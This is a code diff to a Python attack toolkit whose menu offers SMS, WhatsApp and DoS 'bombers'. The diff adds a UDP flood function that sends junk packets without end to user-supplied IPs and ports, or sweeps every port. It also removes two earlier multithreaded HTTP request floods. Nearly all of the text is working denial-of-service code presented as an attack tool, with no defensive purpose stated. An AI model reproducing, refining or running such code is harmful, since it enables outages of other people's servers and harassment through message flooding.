@@ -8,6 +8,7 @@ import os
 import os.path
 import requests
 import datetime
+import socket
 import progressbar
 import time
 import threading
@@ -2059,6 +2060,67 @@ def doser():
 			thr = Thread(target=send)
 			thr.start()
 
+def dosfinal():
+	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+	pb()
+	print('''
+╭━━━╮      ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮  ╭━━━╮
+╰╮╭╮┃      ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯  ┃╭━╮┃
+ ┃┃┃┣━━┳━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮╰╯╭╯┃
+ ┃┃┃┃╭╮┃━━┫┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯╭━╯╭╯
+╭╯╰╯┃╰╯┣━━┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃ ┃  ╰━╮
+╰━━━┻━━┻━━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯ ╰━━━━╯
+		''')
+	print("You can abort the attack by clicking: ctr+z \n")
+	bytes = "qwerty"*2000
+	sent = 0
+	max = 1000
+
+	ips = input("IP: ")
+	ips = (ips+",").split(",")
+	ips.pop()
+
+	ports = input("Ports (80; 80,8080,443; all): ")
+	if ports != "all":
+	    ports = (ports+",").split(",")
+	    ports.pop()
+
+	mode = input("Enable slow mode? (y/n): ")
+
+	print("Start...")
+	time.sleep(0.5)
+
+
+	def attack(ip, port):
+		global sent
+		global max
+		
+		sock.sendto(str.encode(bytes), (ip,int(port)))
+		sent += 1
+		print("%s packages - %s:%s"%(sent,ip,port))
+
+		if mode == "y":
+			if sent == max:
+				max += 1000
+				time.sleep(0.5)
+
+
+	port_for_fast = 1
+	while True:
+		for ip in ips:
+			try:
+				if ports != "all":
+					for port in ports:
+						attack(ip, port)
+				else:
+					attack(ip, port_for_fast)
+					
+					port_for_fast += 1
+					if port_for_fast == 65536:
+						port_for_fast = 1
+			except:
+				print("Server "+ip+" lost!")
+
 def pb():
 	toolbar_width = 40
 	sys.stdout.write("[%s]" % (" " * toolbar_width))
@@ -2084,8 +2146,7 @@ print('''
 ┃3-SMS bomber V.2                               ┃
 ┃4-WhatsApp bomber                              ┃
 ┃5-Dos bomber                                   ┃ 
-┃6-Dos bomber V.2 (Only for powerful computers!)┃
-┃7-Dos bomber V.3                               ┃
+┃6-Dos bomber V.2                               ┃
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 	''')
 ans=int(input(">> "))
@@ -2105,62 +2166,9 @@ elif ans==4:
 elif ans==5:
 	check_internet()
 	doser()
-elif ans==6:  
+elif ans==6:
 	check_internet()
-	pb()
-	print('''
-╭━━━╮      ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮  ╭━━━╮
-╰╮╭╮┃      ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯  ┃╭━╮┃
- ┃┃┃┣━━┳━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮╰╯╭╯┃
- ┃┃┃┃╭╮┃━━┫┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯╭━╯╭╯
-╭╯╰╯┃╰╯┣━━┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃ ┃  ╰━╮
-╰━━━┻━━┻━━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯ ╰━━━━╯
-		''')
-	def dos():
-		tr=input("Please enter the target URL: ")
-		while True:
-			requests.get(tr)
-  
-	while True:
-		threading.Thread(target=dos).start()
-
-elif ans==7:
-	check_internet()
-	pb()
-	print('''
-╭━━━╮      ╭━━╮   ╭━╮╭━┳╮ ╭━━━╮  ╭━━━╮
-╰╮╭╮┃      ┃╭╮┃   ┃ ╰╯ ┃┃ ┃╭━━╯  ┃╭━╮┃
- ┃┃┃┣━━┳━━╮┃╰╯╰┳━━┫╭╮╭╮┃╰━┫╰━━┳━╮╰╯╭╯┃
- ┃┃┃┃╭╮┃━━┫┃╭━╮┃╭╮┃┃┃┃┃┃╭╮┃╭━━┫╭╯╭╮╰╮┃
-╭╯╰╯┃╰╯┣━━┃┃╰━╯┃╰╯┃┃┃┃┃┃╰╯┃╰━━┫┃ ┃╰━╯┃
-╰━━━┻━━┻━━╯╰━━━┻━━┻╯╰╯╰┻━━┻━━━┻╯ ╰━━━╯
-		''')
-	def dos(target):
-	    while True:
-	        try:
-	            res = requests.get(target)
-	            print("Request sent!")
-	        except requests.exceptions.ConnectionError:
-	            print("Connection error!")
-
-	threads = 20
-
-	url = input("Please enter the target URL: ")
-
-	try:
-	    threads = int(input("Threads: "))
-	except ValueError:
-	    exit("Threads count is incorrect!")
-	if threads == 0:
-	    exit("Threads count is incorrect!")
-	if not url.__contains__("http"):
-	    exit("URL doesnt contains http or https!")
-	if not url.__contains__("."):
-	    exit("Invalid domain")
-	for i in range(0, threads):
-	    thr = threading.Thread(target=dos, args=(url,))
-	    thr.start()
-	    print(str(i + 1) + " thread started!")
+	dosfinal()
 
 else:
 	print("ERROR: Invalid value")
